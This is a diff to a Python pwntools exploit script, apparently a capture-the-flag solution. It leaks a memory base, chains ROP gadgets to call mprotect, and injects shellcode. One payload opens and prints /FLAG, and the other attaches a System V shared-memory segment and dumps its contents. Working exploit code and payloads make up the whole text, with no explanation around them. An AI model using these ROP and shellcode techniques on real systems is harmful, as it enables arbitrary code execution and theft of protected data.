@@ -61,6 +61,7 @@ def main():
     timestamp = r.recvline().decode().strip()
     r.recvuntil(b"Random bytes generated at ")
     base = int(r.recvline().decode().strip(),16)
+    stack = base - 0x2000
 
     log.info(f"{timestamp=}")
     log.info(f"{base=}, {hex(base)}")
@@ -75,30 +76,56 @@ def main():
     prax = gadget(base,code,"push rax;ret")
     syscall = gadget(base,code,"syscall;ret")
 
-    log.info(f'{syscall=:x}')
+    print(r.recvline().decode().strip())
+    print(r.recvline().decode().strip())
+
     send_rop(r,[
         rax,60,rdi,37,syscall,
     ])
+    print(r.recvline().decode().strip())
+    print(r.recvline().decode().strip())
+    print(r.recvline().decode().strip())
 
-    stack = base - 0x2000
-
+    file_flag=asm(f"\
+    mov rax,2;mov rdi,{stack};mov rsi,0;syscall;\
+    mov rdi,rax;mov rax,0;mov rsi,{stack+0x200};mov rdx,0x100;syscall;\
+    mov rdx,rax;mov rax,1;mov rdi,1;mov rsi,{stack+0x200};syscall;\
+    mov rax,60;mov rdi,41;syscall;\
+    ")
     send_rop(r,[
         rax,10,rdi,stack,rsi,10*0x10000,rdx,7,syscall,
         rax,0,rdi,0,rsi,stack+0x0000,rdx,20,syscall,
-        rax,0,rdi,0,rsi,stack+0x0100,rdx,0x100,syscall,
+        rax,0,rdi,0,rsi,stack+0x0100,rdx,len(file_flag),syscall,
         stack+0x0100,
     ])
     sleep(0.1)
     r.sendline(b"/FLAG\x00")
     sleep(0.1)
-    shell=asm(f"\
-    mov rax,2;mov rdi,{stack};mov rsi,0;syscall;\
-    mov rdi,rax;mov rax,0;mov rsi,{stack+0x200};mov rdx,0x100;syscall;\
-    mov rdx,rax;mov rax,1;mov rdi,1;mov rsi,{stack+0x200};syscall;\
-    mov rax,60;mov rdi,41;syscall;\
-    ")+b'\x00'
-    print(len(shell))
-    r.sendline(shell)
+    r.send(file_flag)
+    print(r.recvline().decode().strip())
+    print(r.recvline().decode().strip())
+    print(r.recvline().decode().strip())
+    print(r.recvline().decode().strip())
+
+    shm_flag=asm(f"\
+    mov rax,29;mov rdi,0x1337;mov rsi,0;mov rdx,4096;syscall;\
+    mov rdi,rax;mov rax,30;mov rsi,0;mov rdx,4096;syscall;\
+    mov rsi,rax;mov rax,1;mov rdi,1;mov rdx,0x80;syscall;\
+    mov rdi,87;mov rax,60;syscall;\
+    ")
+    send_rop(r,[
+        rax,10,rdi,stack,rsi,10*0x10000,rdx,7,syscall,
+        rax,0,rdi,0,rsi,stack+0x0800,rdx,len(shm_flag),syscall,
+        stack+0x0800,
+    ])
+    sleep(0.1)
+    r.send(shm_flag)
+    print(r.recvline().decode().strip())
+    print(r.recvline().decode().strip())
+    flag=(r.recvuntil(b'** CMD').decode().strip())
+    print('** CMD',r.recvline().decode().strip())
+    print(r.recvline().decode().strip())
+
 
     r.interactive()
     return
